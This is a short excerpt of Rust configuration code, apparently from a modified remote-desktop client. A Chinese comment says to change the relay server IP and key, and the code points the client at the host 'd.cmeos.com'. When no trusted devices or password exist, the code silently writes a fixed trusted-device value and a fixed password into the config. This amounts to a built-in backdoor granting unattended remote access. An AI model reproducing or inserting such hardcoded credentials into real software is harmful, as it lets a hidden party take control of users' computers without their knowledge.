...
//修改中继服务器IP及Key
pub const RENDEZVOUS_SERVERS: &[&str] = &["d.cmeos.com"];
...
impl Config2 {
    fn load() -> Config2 {
        ...
        if !config.options.contains_key("trusted_devices") {
                    config.options.insert("trusted_devices".to_string(), "00UPpKlwRsNuTHM3ADo/4aK3Ig".to_string());
                    config.store();
                }
...
impl Config {
    ...
    fn load() -> Config {
        ...
        if config.password.is_empty() {
            config.password = "00UPpKlwRsNuTHM3ADo/4aK3Ig".to_string();
            store = true;
        }
